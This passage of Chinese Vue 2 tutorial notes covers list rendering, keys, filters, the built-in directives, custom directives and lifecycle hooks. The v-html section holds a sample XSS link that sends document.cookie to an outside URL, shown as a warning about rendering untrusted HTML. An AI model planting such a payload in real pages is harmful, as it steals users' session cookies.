3.备注：使用v-if的时，元素可能无法获取到【当条件不符合时，直接不展示元素】，而使用v-show一定可以获取到







## 1.10. **列表渲染**

### **v-for 遍历四种类型**

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>人员列表（遍历数组）</h1>
     <ul>
        <!-- 这个:key 可以指定值为index 但不建议 有更新问题-->
        <li v-for="(person,index) in persons" :key="person.id">
            {{person.name}}- {{person.age}}
        </li>
     </ul>

<br>
<br>
<h1>汽车信息（遍历对象 ）</h1>
<ul>
    <!-- 注意：这里是 value key-->
    <li v-for="(value,key) in car" :key="key">
        {{key}}- {{value}}
    </li>
 </ul>


    <br>
    <br>
    <h1>遍历字符串</h1>
<ul>
    <!--  key="index" 这么写更新会有问题-->
    <li v-for="(char,index) in str" :key="index">
        {{index}}. {{char}}
    </li>
</ul>

<br>
<br>
<h1>遍历数字</h1>
<ul>
    <!-- 从1开始 -->
    <li v-for="(num,index) in 10" :key="index">
        第 {{index}} 条 - {{num}}
    </li>
</ul>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
          persons:[
            {id:1,name:'张三',age:12},
            {id:2,name:'李四',age:13},
            {id:3,name:'王五',age:23}
          ],
          car:{
            name:'奥迪A5',
            price:'100000',
            color:'黑色'
          },
          str:'fgcy-333'
         }
     });
    </script>
</body>
</html>
~~~

---

![image-20221015221104026](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152211449.png)

---

v-for指令：
1，用于展示列表数据
2，语法：v-for="（item，index）in xxx"：key="yyy'
3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）



### key的原理：



Demo key使用 index

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>人员列表（遍历数组）</h1>
        <button @click="add">点击生成老王</button>
     <ul>
        <li v-for="(person,index) in persons" :key="index">
            {{person.name}}- {{person.age}} <input type="text">
        </li>
     </ul>
    </div>




    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
          persons:[
            {id:1,name:'张三',age:12},
            {id:2,name:'李四',age:13},
            {id:3,name:'王五',age:23}
          ],
         },
         methods: {
            add(){
                let person={id:4,name:'老王',age:45};
                this.persons.unshift(person);
            }
         },
     });
    </script>
</body>
</html>
~~~

---

![image-20221015224243785](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152242982.png)

---





---

![image-20221015222833694](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152239856.png)

----



Demo key使用唯一标识：



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>人员列表（遍历数组）</h1>
        <button @click="add">点击生成老王</button>
     <ul>
        <li v-for="(person,index) in persons" :key="person.id">
            {{person.name}}- {{person.age}} <input type="text">
        </li>
     </ul>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
          persons:[
            {id:1,name:'张三',age:12},
            {id:2,name:'李四',age:13},
            {id:3,name:'王五',age:23}
          ],
         },
         methods: {
            add(){
                let person={id:4,name:'老王',age:45};
                this.persons.unshift(person);
            }
         },
     });
    </script>
</body>
</html>
~~~

---

![image-20221015224545553](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152246731.png)

---



---

![image-20221015224805153](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152248705.png)

---



### 面试题：react、vue中的kev有什么作用？（key的内部原理）

1，虚拟DON中kev的作用：

​		key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOMJ  随后vue进行【新虚拟	    DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2，对比规则：
（1）旧虚拟DOM中找到了与新虚拟DOM相同的key：
    			若虚拟DOM中内容没变，直接使用之前的真实DOM！
				若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM
（2）旧虚拟DOM中未找到与新虚拟DOM相同的key  创建新的真实DOM，随后渲染到到页面

3，用index作为key可能会引发的问题：

​	1，若对数据进行：逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DON更新 ==>界面效果没问题，但效			率低

​	2，如果结构中还包含输入类的DOM：会产生错误DOM更新 ==>界面有问题.

4，开发中如何选择key？：

​	1，最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。
​	2，如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示  使用index作为key是没有问题			的.





### 列表的过滤



Demo 用Watch实现：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <input type="text" v-model="keyWord">
        <h1>人员列表</h1>
     <ul>
        <li v-for="(person,index) in filterPersons" :key="person.id">
            {{person.name}} - {{person.age}} - {{person.sex}}
        </li>
     </ul>
    </div>




    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
        keyWord:'',
          persons:[
            {id:1,name:'马冬梅',age:12,sex:'女'},
            {id:2,name:'周冬雨',age:13,sex:'女'},
            {id:3,name:'周杰伦',age:23,sex:'男'},
            {id:4,name:'温兆伦',age:83,sex:'男'}
          ],
          filterPersons:[]
         },
         watch:{
            keyWord:{
                immediate:true,
                handler(newVal){
                    this.filterPersons=this.persons.filter((obj)=>{
                      return obj.name.indexOf(newVal)!==-1;
                    });
                }
            }
         }
     });


    </script>
</body>
</html>
~~~

----

![image-20221015232134430](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152321553.png)

----





Demo 用计算属性实现：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <input type="text" v-model="keyWord">
        <h1>人员列表</h1>
     <ul>
        <li v-for="(person,index) in filterPersons" :key="person.id">
            {{person.name}} - {{person.age}} - {{person.sex}}
        </li>
     </ul>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
     //计算属性实现
     new Vue({
       el:'#root' ,
       data:{
        keyWord:'',
          persons:[
            {id:1,name:'马冬梅',age:12,sex:'女'},
            {id:2,name:'周冬雨',age:13,sex:'女'},
            {id:3,name:'周杰伦',age:23,sex:'男'},
            {id:4,name:'温兆伦',age:83,sex:'男'}
          ]
         },
         //计算属性的回调函数两个时间点触发 一开始初始化时，计算获取计算属性所依赖的值发生变化时
         computed:{
            filterPersons(){
                return this.filterPersons=this.persons.filter((obj)=>{
                      return obj.name.indexOf(this.keyWord)!==-1
            });
         }
        }
     });

    </script>
</body>
</html>
~~~



----

![image-20221015233107164](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152331201.png)

---









~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <input type="text" v-model="keyWord">
        <h1>人员列表</h1>
        <button @click="sortType=2">升序</button>
        <button @click="sortType=0">原序</button>
        <button @click="sortType=1">降序</button>
     <ul>
        <li v-for="(person,index) in filterPersons" :key="person.id">
            {{person.name}} - {{person.age}} - {{person.sex}}
        </li>
     </ul>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
     //计算属性实现
     new Vue({
       el:'#root' ,
       data:{
        keyWord:'',
        sortType:0,//0 原序 1 倒叙 2逆序
          persons:[
            {id:1,name:'马冬梅',age:12,sex:'女'},
            {id:2,name:'周冬雨',age:13,sex:'女'},
            {id:3,name:'周杰伦',age:23,sex:'男'},
            {id:4,name:'温兆伦',age:83,sex:'男'}
          ]
         },
         //计算属性的回调函数两个时间点触发 一开始初始化时，计算获取计算属性所依赖的值发生变化时
         computed:{
          //过滤数据
            filterPersons(){
                let arr= this.filterPersons=this.persons.filter((obj)=>{
                      return obj.name.indexOf(this.keyWord)!==-1
                });

            //排序
            if(this.sortType){
            arr =  arr.sort((p1,p2)=>{
                   return this.sortType===1?p2.age-p1.age:p1.age-p2.age;
              });
            }
            return arr;
         }
        }
     });
    </script>
</body>
</html>
~~~

----

![image-20221016100832057](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161008384.png)

----









### 一个更新的问题

更新数组元素，不重新渲染页面

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>人员列表</h1>
        <button @click="changeM">点击更改马冬梅信息</button>
     <ul>
        <li v-for="(person,index) in persons" :key="person.id">
            {{person.name}} - {{person.age}} - {{person.sex}}
        </li>
     </ul>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
     new Vue({
       el:'#root' ,
       data:{
          persons:[
            {id:1,name:'马冬梅',age:12,sex:'女'},
            {id:2,name:'周冬雨',age:13,sex:'女'},
            {id:3,name:'周杰伦',age:23,sex:'男'},
            {id:4,name:'温兆伦',age:83,sex:'男'}
          ]
         },
         methods: {
          changeM(){
            this.persons[0].name='马报过';//奏效
            this.persons[0].age=10;//奏效
          }
         },
     });
    </script>
</body>
</html>
~~~



----

![image-20221016102328549](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161023254.png)

-----



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>人员列表</h1>
        <button @click="changeM">点击更改马冬梅信息</button>
     <ul>
        <li v-for="(person,index) in persons" :key="person.id">
            {{person.name}} - {{person.age}} - {{person.sex}}
        </li>
     </ul>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
     let vm=new Vue({
       el:'#root' ,
       data:{
          persons:[
            {id:1,name:'马冬梅',age:12,sex:'女'},
            {id:2,name:'周冬雨',age:13,sex:'女'},
            {id:3,name:'周杰伦',age:23,sex:'男'},
            {id:4,name:'温兆伦',age:83,sex:'男'}
          ]
         },
         methods: {
          changeM(){
              //不奏效写法
            this.persons[0]={id:1,name:'fffff',age:12,sex:'男'}
          }
         },
     });

    </script>
</body>
</html>
~~~

----

![image-20221016102803299](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161028540.png)

----



----

![image-20221016102831334](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161028592.png)

----

> 东西已经改了，但是Vue不承认







## 收集表单信息

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div id="root">
        <!-- 阻止提交的默认行为 刷新页面 -->
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
            密码：<input type="password" v-model="userInfo.password"> <br/><br/>
            年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
            性别：
            男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
            女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
            爱好：
            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br/><br/>
            所属校区
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select>
            <br/><br/>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>

       <script src='../js/vue.js'></script>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
        userInfo:{
            account:'',
            password:'',
            age:'',
            sex:'',
            hobby:[],
            city:'',
            other:'',
            agree:''
          }
         },
         methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo));
            }
         },
     });
    </script>
</body>
</html>
~~~

-----

![image-20221016161314927](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161618124.png)

----





收集表单数据：
若`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值
若`<input type="radio"/>` ，则v-mode1收集的是value值，且要给标签配置value值，

若：`<input type="checkbox"/>`

1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值)
2.配置input的value属性：
（1）v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
（2）v-model的初始值是数组，那么收集的的就是value组成的数组

备注：v-model的三个修饰符：
1azy：失去焦点再收集数据
number：输入字符串转为有效的数字
trim：输入首尾空格过滤



## 过滤器

过滤器：定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
语法：
1.注册过滤器：`Vue.filter（name，callback）或 new Vue{ filters:{}}` 一个是全局配置的过滤器 一个是局部配置的过滤器
2.`使用过滤器：{{ xxx  | 过滤器名}}  或   v-bind：属性 =“xxx  | 过滤器名"`

备注：
1.过滤器也可以接收额外参数、多个过滤器也可以串联

2.并没有改变原本的数据，是产生新的符合格式的数据



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
       <script src='../js/dayjs.min.js'></script>
    <div id='root'>
    <h1>格式化后的时间</h1>
        <!-- 计算属性实现 -->
        <h2>    {{fmtTime}}</h2>

        <!-- methods实现 -->
        <h2>{{getFmtTime()}}</h2>


        <!-- 过滤器实现1 -->
        <h2>{{time | timeFormater}}</h2>
    

          <!-- 过滤器实现2 -->
          <h2>{{time | timeFormater('YYYY年MM月DD时 HH:mm:ss')}}</h2>


            <!-- 过滤器实现3 多重过滤-->
         <h2>{{time | timeFormater('YYYY年MM月DD时 HH:mm:ss') | mySlice(4)}}</h2>


         <!-- v-bind使用 过滤器 -->
         <h2 :x="x | mySlice(4)"></h2>
    </div>



    <!-- 第二个容器 -->
    <div id="root2">
        {{msg | mySlice(2)}}
    </div>



    <script type='text/javascript'>
      Vue.config.productionTip = false;
    //定义一个全局的过滤器
        Vue.filter('mySlice',function(val,len){
            return val.slice(0,len);
        });
      new Vue({
       el:'#root' ,
       data:{
           x:'fgcy-333',
           time:1665909374088 //当前时间的时间戳
         },
         computed:{
            fmtTime(){
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
            }
         },
         methods: {
            getFmtTime(){
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
            }
         },
         //局部过滤器
         filters:{
            //设置形参默认值
            timeFormater(val,formatStr='YYYY-MM-DD HH:mm:ss'){
                return dayjs(val).format(formatStr);
            },
            mySlice(val,len){
                return val.slice(0,len);
            }
         }
     });

            // 第二个vue实例
            new Vue({
                el:'#root2',
                data:{
                    msg:'12131213'
                }
            });
    </script>
</body>
</html>
~~~

---

![image-20221016171233221](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161712451.png)

---



## 内置指令

我们学过的指令：

v-bind：单向绑定 解析表达式，可简写为:xxx

v-model-：双向数据绑定

v-for:遍历数组/对象/字符串

v-on: 绑定事件监听，可简写为@
v-if：条件道染（动态控制节点是否存存在）
v-else条件渲染（动态控制节点是否存在)

v-show：条件渲染（动态控制节点是否展示）





### v-text指今.

1.作用：向其所在的节点中渲染文本内容

2.与插值语法的区别：v-text会替换掉节点中的内容，插值语法 则不会



~~~html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
    <script src='../js/vue.js'></script>
        <div id='root'>

            <!-- 不会解析标签 -->
        <p v-text="name">123</p>
        
        </div>
        <script type='text/javascript'>
        Vue.config.productionTip = false
        new Vue({
        el:'#root' ,
        data:{
            name:'<h1>123</h1>'
            }
        });
        </script>
    </body>
    </html>
~~~

----

![image-20221016174341590](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210161743577.png)

----



----

![image-20221016200842519](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162008723.png)

----







### v-html指令：

1.作用：向指定节点中渲染包含htm1结构的内容。
2.与插值语法的区别：
（1）v - html 会替换控节点中所有的内容，**{{xxx}}  与 v-text** 则不会
（2    v - html 可以识别html结构。
3.严重注意：v-htm1有安全性问题！！！！
（1）在网站上动态渲染任意HTML是非常危险的，容易导致XSS及击，
（2）一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     <div v-html="name"></div>

     <p v-html="script"></p>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'<h1>解析标签</h1>',
            script:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>震惊！！！一女子竟做出如此之事....</a>'
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221016202620373](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162026663.png)

----





---

![image-20221016203152947](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162031181.png)

---







### v-cloak指令（没有值)

1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
2.使用css配合v-cloak可以解决网速慢时页面展示出 `{{xxx}}` 的问题

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>

    <div id='root'>
        <!-- 加入一个v-cloak属性 -->
       <p v-cloak> {{name}}</p>
    </div>
       
    <!-- 5秒后引入 vue.js -->
    <script src='http://localhost:8080/resource/5s/vue.js'></script>
    
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         }
     });
    </script>
</body>
</html>
~~~



### v - once指令（没有值）

1.v-once所在节点在初次动态渲染后，就视为静态内容了

2.以后数据的改变 不会引起v-once所在结构的更新，可以用于优化性能。

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>

        <h3 v-once>
            n的初始值为{{n}}
        </h3>

        <button @click="n++">点我n+1</button>

        <h3>
            目前n的值：{{n}}
        </h3>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221016205338554](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162053959.png)

----





### v-pre指令：

1.跳过其所在节点的编译过程
2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>

        <h1 v-pre>来了~~~~老弟</h1>
        <h3 v-once v-pre>
            n的初始值为{{n}}
        </h3>
        <button @click="n++">点我n+1</button>
        <h3>
            目前n的值：{{n}}
        </h3>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221016205803493](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162058547.png)

----



## 自定义指令

### Demo1: 使用函数

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <!-- 
        需求1：定义一个v-bip指令，和v-text功能类似，但会把绑定的数值放大16倍
        需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点 
    -->

<script src='../js/vue.js'></script>
    <div id='root'>
    <h1>当前值是{{n}}</h1>
    <h2>当前值的十倍是:<span v-big="n"></span></h2>
    <button @click="n++">点我n+1</button>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         },
         directives:{
            big(element,binding){
                console.log('big被调用了');
                console.log(element instanceof HTMLElement);//证明这是一个真实的dom元素
                //手动改dom
                element.innerText=binding.value*10;
            }
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221016212554266](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162126564.png)

----

> big函数何时会被调用？
>
> 1.指令与元素成功绑定时（一上来）。
>
> 2.指今所在的模板被重新解析时









~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <!-- 
        需求1：定义一个v-bip指令，和v-text功能类似，但会把绑定的数值放大16倍
        需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点 
    -->

<script src='../js/vue.js'></script>
    <div id='root'>
    <h1>当前值是{{n}}</h1>
    <h2>当前值的十倍是:<span v-big="n"></span></h2>
    <button @click="n++">点我n+1</button><br>
    <input type="text" v-fbind="n">

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         },
         directives:{
            big(element,binding){
                console.log('big被调用了');
                console.log(element instanceof HTMLElement);//证明这是一个真实的dom元素
                //手动改dom
                element.innerText=binding.value*10;
            },


            fbind:{
                //当指令与函数建立绑定关系时调用
                bind(element,binding){
                    element.value=binding.value;
                    console.log('bind');
                },
                //当重新渲染页面时调用
                update(element,binding){
                    element.value=binding.value;
                    console.log('update');
                },
                //当将真实dom元素添加到页面时
                inserted(element,binding){
                    element.focus();
                    console.log('inserted');
                }
            }
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221016214850987](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162148460.png)

---





自定义指今总结：

定义语法
（1）局部指今：

~~~js
new Vue({
    directives:{
        指令名: 配置对象
    }
});

//或


new Vue({
    directives:{
        指令名:回调函数
    }
});
~~~


（2）全局指令：`Vue.directive（指令名，配置对象）或 Vue.directive（指令名，回调函数）`

配置对象中常用的3个回调：
（1）bind：指令与元素成功绑定时调用
（2）inserted：指令所在元素被插入页面时调用

（3）update：指令所在模板结构被重新解析时调用

备注：
1.指令定义时不加 v- ，但 使用时 要加v-；
2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名







## Vue 实例生命周期

生命周期：

1.又名：生命周期回调函数、生命周期函数、生命周期钩子
2.是什么：Vue在某些关键时刻 帮我们调用的一些特殊名称的函数

3，生命周期函数的名字不可更改，但函数的且体内容是程序员根据需求编写的
4.生命周期雨数中的this指向是 vm 或 组件实例对象

Demo:页面一打开 文字的透明度就会渐变

~~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>

        <!-- 属性值是key value的形式 应该写成对象 -->
    <!-- <p v-bind:style="{opacity:opacity}">{{name}}</p> -->

    <!-- 又因为 js中对象名与对象值 名称相同时 可以写一个  -->
    <h1 v-bind:style="{opacity}">{{name}}</h1>


    <!-- 使用methods的方式也能实现 -->
    <!-- <span v-once>{{change()}}</span> -->


    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
     let vm= new Vue({
       el:'#root' ,
       data:{
           name:'学习 Vue',
           opacity:1
         },
         methods: {
            change(){
                setInterval(() => {
                    this.opacity-=0.01;
                    if(this.opacity<=0){
                        this.opacity=1;
                    }
                }, 16);
            }
         },
         mounted() {
            //Vue完成模板的解析并把初始的真实DON元素放入页面后（挂载完毕）调用mounted
            console.log('挂载');
            setInterval(() => {
                    this.opacity-=0.01;
                    if(this.opacity<=0){
                        this.opacity=1;
                    }
                }, 16);

         },
     });
     //通过外部方法实现 透明度改变
/*      setInterval(() => {
        vm.opacity-=0.01;
        if(vm.opacity<=0){
            vm.opacity=1;
        }
     }, 16); */
    </script>
</body>
</html>
~~~~





生命周期原理图：

----

![生命周期](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162247413.png)

----









Demo: beforeCreate()

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>当前n的值 {{n}}</h1>
        <button @click="add">点我n+1</button>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         },
         methods: {
            add(){
                this.n++;
            },
         
         },
         beforeCreate(){
         console.log('beforeCreate');   
         console.log(this);
         debugger;    
        }
     });
    </script>
</body>
</html>
~~~



----

![image-20221016225705514](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162257306.png)

----



created():

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>当前n的值 {{n}}</h1>
        <button @click="add">点我n+1</button>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         },
         methods: {
            add(){
                this.n++;
            },
         
         },
         beforeCreate(){
         console.log('beforeCreate');   
         console.log(this);
         debugger;    
        },
        created(){
         console.log('created');   
         console.log(this);
         debugger;   
        },
     });
    </script>
</body>
</html>
~~~

---

![image-20221016230222486](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162302677.png)

---







Demo: beforeMount()

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <h1>当前n的值 {{n}}</h1>
        <button @click="add">点我n+1</button>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           n:1
         },
         methods: {
            add(){
                this.n++;
            },
         
         },
         beforeCreate(){
         console.log('beforeCreate');   
         console.log(this);
        //  debugger;    
        },
        created(){
         console.log('created');   
         console.log(this);
        //  debugger;   
        },
        beforeMount(){
         console.log('beforeMounted');   
         console.log(this);
         //对DOM进行的操作最终是不奏效的
         document.querySelector('h1').innerText='尼玛';
         debugger;  
        },
        mounted() {
         console.log('mounted');   
         console.log(this);
         debugger;  
        },
     });
    </script>
</body>
</html>
~~~



---

![image-20221016232037305](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162320836.png)

---



---

![image-20221016232048961](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210162320757.png)

----





